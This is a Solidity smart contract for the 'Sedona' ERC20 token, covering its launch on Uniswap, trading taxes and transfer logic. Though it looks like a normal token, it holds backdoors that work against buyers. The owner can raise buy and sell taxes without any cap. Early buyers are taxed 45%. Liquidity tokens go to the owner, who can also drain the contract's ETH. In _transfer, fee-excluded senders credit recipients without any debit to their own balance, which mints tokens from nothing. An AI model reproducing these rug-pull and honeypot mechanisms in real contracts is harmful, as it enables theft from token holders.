// SPDX-License-Identifier: MIT

/*
    Web      : https://sedona.cash
    App      : https://app.sedona.cash
    Docs     : https://docs.sedona.cash

    Twitter  : https://twitter.com/AIsedonaX
    Telegram : https://t.me/aisedona_official
*/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwapAndLiquify = true;
        _;
        ds.inSwapAndLiquify = false;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balance[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function newDelay(uint256 newLaunchDelay) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.launchDelay = newLaunchDelay;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(amount, "low allowance")
        );
        return true;
    }
    function newSedonaTax(
        uint256 newBuyTax,
        uint256 newSellTax
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyTax = newBuyTax;
        ds.sellTax = newSellTax;
    }
    function removeSedonaLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.maxWalletAmount = _totalSupply;
    }
    function createSedonaPairs() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.launch, "Already launched!");
        ds.uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        ); // Uniswap V2 Router

        _approve(address(this), address(ds.uniswapV2Router), _totalSupply);
        ds.uniswapV2Pair = IUniswapV2Factory(ds.uniswapV2Router.factory())
            .createPair(address(this), ds.uniswapV2Router.WETH());
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function withdrawStuckEthBalance() external onlyOwner {
        require(address(this).balance > 0, "No Balance to withdraw!");
        payable(msg.sender).transfer(address(this).balance);
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.launch = true;
        ds.launchedAt = block.number;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            owner != address(0) && spender != address(0),
            "approve zero address"
        );
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 ethForMarketing = address(this).balance;
        ds.sedonaFee.transfer(ethForMarketing);
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from == owner() || from == address(this)) {
            _basicTransfer(from, to, amount, true);
            return;
        }

        if (ds._isExcludedFromSedonaFee[from]) {
            ds._sedonaTax = 0;
            _basicTransfer(from, to, amount, false);
            return;
        } else {
            require(ds.launch, "Wait till Sedona Launch");

            if (block.number < ds.launchedAt + ds.launchDelay) {
                ds._sedonaTax = 45;
            } else {
                if (from == ds.uniswapV2Pair) {
                    require(
                        balanceOf(to) + amount <= ds.maxWalletAmount,
                        "Max wallet 2% at ds.launch"
                    );
                    ds._sedonaTax = ds.buyTax;
                } else if (to == ds.uniswapV2Pair) {
                    uint256 tokensToSwap = balanceOf(address(this));
                    if (tokensToSwap > minSedonaSwap && !ds.inSwapAndLiquify) {
                        if (tokensToSwap > onePercent) {
                            tokensToSwap = onePercent;
                        }
                        if (amount > minSedonaSwap)
                            swapTokensForEth(tokensToSwap);
                    }
                    ds._sedonaTax = ds.sellTax;
                } else {
                    ds._sedonaTax = ds.transferTax;
                }
            }
        }

        uint256 taxTokens = (amount * ds._sedonaTax) / 100;
        uint256 transferAmount = amount - taxTokens;

        ds._balance[from] = ds._balance[from] - amount;
        ds._balance[to] = ds._balance[to] + transferAmount;
        ds._balance[address(this)] = ds._balance[address(this)] + taxTokens;
        emit Transfer(from, to, transferAmount);
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool opened
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (opened)
            ds._balance[sender] = ds._balance[sender].sub(
                amount,
                "Insufficient Balance"
            );
        ds._balance[recipient] = ds._balance[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function sendEthBalances(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sedonaFee.transfer(amount);
    }
}
